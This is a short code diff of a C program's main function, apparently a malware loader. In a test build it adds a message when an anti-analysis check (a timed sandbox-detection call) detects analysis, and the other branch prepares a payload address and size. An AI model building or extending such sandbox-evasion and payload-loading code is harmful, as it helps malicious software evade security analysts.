@@ -15,7 +15,9 @@ int main() {
 #ifdef TEST
 	DWORD	seconds = 5;
 	DWORD	dwMilliseconds = seconds * 1000;
-	AntiAnalysis(dwMilliseconds);
+	if (AntiAnalysis(dwMilliseconds) == FALSE) {
+		printf("File Is Being Analyzed!\n");
+	}
 #else
 	PVOID pPayloadAddress = NULL;
 	SIZE_T sPayloadSize = 0;
